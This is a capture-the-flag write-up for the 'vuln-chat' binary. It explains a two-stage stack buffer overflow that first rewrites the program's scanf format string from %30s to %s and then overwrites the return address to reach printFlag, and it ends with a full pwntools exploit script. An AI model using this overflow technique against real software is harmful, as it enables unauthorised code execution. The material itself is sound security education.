**This is a writeup for the vulnchat challenge**

Let's take a look at the main function of the program
```
undefined4 main(void)

{
  undefined1 trust [20];
  undefined1 username [20];
  undefined4 scan;
  undefined1 local_5;
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  scan = 0x73303325;
  local_5 = 0;
  __isoc99_scanf(&scan,username);
  printf("Welcome %s!\n",username);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can tru st you?");
  printf("%s: ",username);
  __isoc99_scanf(&scan,trust);
  puts("djinn: Sorry. That\'s not good enough");
  fflush(stdout);
  return 0;
}
```

Ok so first we see that we are defining these variables
```
undefined1 trust [20];
undefined1 username [20];
undefined4 scan;
undefined1 local_5;
```

We must notice that scan is set to = 0x73303325. Why is this important?
Well if we break up this value into different bits in little endian \x73 \x30 \x33 \x25. Starting with x25 and working backwards, our scan variable = %30s.
Now the program prompts us for an input with this line of code:
```
__isoc99_scanf(&scan,username);
```
We now are getting the value at &scan whihc is %30s so we are setting a limit of 30 characters that can be read and stored into the username buffer.

Now at our second scanf we are essentially doing the same thing:
```
__isoc99_scanf(&scan,trust);
```

We are taking the %30s value in scan and allowing only 30 chars to be read into the trust buffer.

Finally, we return 0 and end the program.

If we look atthe other functions that are in the binary we can see the function "printFlag"
```
void printFlag(void) {
    system("/bin/cat ./flag.txt");
    puts("Use it wisely");
    return;
}
```
From this method we can see that when called, it will print out the flag in flag.txt


**Attack Method**
Ok so how do we get the printFlag function to execute? Well we need to overwrite the return address so that when the program returns, it will instead execute the printFlag function.

Now lets take a look at our stack so we can see what our payload will look like in order to overwrite the return address.
```
Stack[-0x5]:1 local_5
Stack[-0x9]:4 scan
Stack[-0x1d]:20 username
Stack[-0x31]:20 trust
```

Ok, so the first buffer we write to is the username buffer by using the value at scanf. the distance from username to the return address is 0x29 and then writing the address will require more than the 30 characters that we are allowed to write to with the %30s. 

So what does this mean? Well it means that our first payload must overflow the username buffer and overwrite the scan variable so that we can write a large amount of data so that we can overwrite the return address.

So now we need to get the offset between username buffer and scan variable.
[-0x1d] - [-0x9] = 29 - 9 = 20. All we need to do is overflow the username buffer with 20 bytes of data and then we can use the remaining to manipulate the scan variable. We can a bit of the previous valu that scan was originally set to. We can ues the value 0x7325 since \x73 = s and \25 is = % meaning that this will set scan to %s, which has no limit on the amount of characters we can use as input.

Our first payload will look like this:
```
payload1 = b'A' * 0x14 + p32(0x7325)
```

Ok so now that we have scan = %s, that means that the next scanf function that we have will allow us to write as many characters we want to be stored into the trust buffer which will allow us to overflow it all and manipulate the program memory all the way to the return address.

Now we need to find the offset between the trust buffer and the return address.
[0x31] - [0x0] = 49 so if we write 49 characters into the trust buffer, then we will be able to write all the way until the return address. Then all we need to do is find the address of the printFlag function and put that in our payload.

Our second payload will look like this:
```
payload2 = b'A' * 0x31 _ p32(0x0804856b)
```

Now our two payloads will allow us to overwrite the return address and set it equal to the printFlag function address which will print the flag.

**Final Payload**
```
from pwn import *

BINARY = "./vuln-chat"
elf = ELF(BINARY)
context.binary = elf

TARGET_ADDRESS = 0x0804856b 
OFFSET1 = 0x14
OFFSET2 = 0x31

payload1 = b'A' * OFFSET1 + p32(0x7325)
payload2 = b"B" * OFFSET2 + p32(TARGET_ADDRESS)

def exploit_local():
    r = process(BINARY)
    r.recvuntil(b"Enter your username: ")	
    r.sendline(payload1)
    r.recvuntil(b"djinn: I have the information. But how do I know I can trust you?")
    r.sendline(payload2)
    r.interactive()

if __name__ == "__main__":
    exploit_local()
```
